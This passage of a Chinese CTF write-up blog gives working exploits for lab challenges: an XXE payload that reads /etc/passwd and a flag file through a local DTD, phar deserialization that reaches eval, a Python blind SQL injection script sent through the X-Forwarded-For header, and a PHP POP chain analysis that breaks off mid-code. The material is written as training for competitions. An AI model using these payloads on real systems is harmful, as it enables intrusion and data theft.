plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#x27;Your DTD code&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p>然后通过错误的利用和带外的利用，模板：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">    %eval;</span><br><span class="line">    %error;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>我们通过报错，成功解析了参数实体，%file;也就可以成功读取flag。</p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///hhh/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">    &amp;#x25;eval;</span><br><span class="line">    &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>登录页面，注了半天，结果是弱口令</p><p>里面是一个文件上传，上传后文件后缀名会被自动修改成txt，应该是没办法写入一句话木马上传。</p><p>这里有个file参数，我们想任意读取一下文件，但是后面会拼接字符串，那我们试一下php伪协议读取upload。</p><p>成功读取，解码得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sandbox</span> = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line"><span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"><span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$uploader</span> = <span class="keyword">new</span> Uploader();</span><br><span class="line"><span class="variable">$uploader</span>-&gt;upload(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents(<span class="variable">$uploader</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$uploader</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>怎么sql的题目变成反序列化了，这题目毫不相干！！！</p><p>仔细审计一下代码，有两个突破口，eval和file_get_contents</p><p>但是发现可以通过函数file_get_contents直接读取上传的文件内容，由于name的参数值可控，所以我们只要上传为藏有flag的文件名即可，这里就需要我们枚举一下，试过读取flag.php 就会返回flag.php，尝试一下，成功返回flag.php内容。</p><p>下面我们试一下使用函数eval来读取flag.php</p><p>想执行eval有个条件限制，要求<code>$this-&gt;token != $_SESSION[&#39;user&#39;]</code></p><p>其实前面做题就注意到了上传后的文件名前面一部分没变化</p><p>我们就可以得到<code>$_SESSION[&#39;user&#39;]</code>的值：</p><p>GXYe4b1116bd1774dcfc943ca7d4039593e</p><p>需要利用到phar反序列化，在_toString方法中看到，返回值是filename，也是我们可控的name值，最后在让file_get_contents读取flag.php内容，可以开始构造phar文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Uploader</span><br><span class="line">&#123;</span><br><span class="line">    public $Filename;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o=new Uploader();</span><br><span class="line">$o-&gt;cmd=&#x27;highlight_file(&quot;/var/www/html/flag.php)&#x27;;</span><br><span class="line">$o-&gt;Filename=&#x27;test&#x27;;</span><br><span class="line">$o-&gt;token=&#x27;GXYe4b1116bd1774dcfc943ca7d4039593e&#x27;;</span><br><span class="line">echo serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub，增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在本地生成后，上传phar后，name参数赋值,这样$this-&gt;filename被我们指定为phar，phar://+上传phar文件的地址，再任意上传一个文件，触发phar反序列化,得到flag。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=upload&amp;name=phar:///var/www/html/uploads/52aa4224a0b7d9543d9b00bd0320dd2b/GXYe73a4626f60f8f934fd9892170c85a37.txt</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>本题考查XFF的sql盲注，二次注入。</p><p>我们得到一次数据，需要构造三个payload，才能执行我们第一次注入的payload语句，这也就是二次注入。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26233/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)<span class="comment">#这里的右移动一位相当于除以2,速度会更快</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=492bf5ce-c5bb-482b-b1ab-ca34206af782&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=492bf5ce-c5bb-482b-b1ab-ca34206af782&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;111&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">                    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;track_uuid=492bf5ce-c5bb-482b-b1ab-ca34206af782&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload</span><br><span class="line">                    &#125;</span><br><span class="line">        r = requests.post(url = url, headers = headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Last Ip: 1&#x27;</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Last Ip: 1&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(mid),res)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>fuzz测试，<a href="http://www.zip泄漏,拿到源码./">www.zip泄漏，拿到源码。</a></p><p>好好审计一下源码，在update.php中发现我们需要使得$_SESSION[‘login’]===1，在lib.php中看出，也就是让token值等于admin，才可以得到flag。</p><p>发现目标，我们就需要找到突破口，好好审计lib.php</p><p>审计一下dbCtrl类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">        <span class="variable">$result</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反序列化控制token为admin即可绕过登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password) !== <span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道登录成功的条件是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名存在，并且满足md5($this-&gt;password) == $passwordResult</span><br><span class="line">或者</span><br><span class="line">token的值是admin</span><br></pre></td></tr></table></figure><p>代码中的查询语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,password from user where username=?</span><br></pre></td></tr></table></figure><p>但是sql语句是我们可控的，我们可以控制参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#x27;md5(1)的值&#x27; from user where username=?</span><br></pre></td></tr></table></figure><p>然后再使</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;password=1</span><br></pre></td></tr></table></figure><p>即可绕过登录验证。</p><p>接下来就需要构造pop链了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于UpdateHelper::destruct方法中有echo，所以我们只需将$sql实例化为User类的对象，这样就可以触发User::toString方法</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=unserialize(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再看User::__toString方法，用$nickname变量调用了update()函数，并且$age为参数，所以我们只需将$nickname实例化为info类对象，从而调用了info::__call方法，并且$age中的值会作为参数传入。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跟进Info:__call方法，其中的$CtrlCase调用了login方法，传入login方法的参数就是上一步通过User.age的值传入的，然后我们再将$CtrlCase变量实例化为dbCtrl类对象，这样就调用了dbCtrl::login($sql)完成我们的最终目的。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的pop链构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 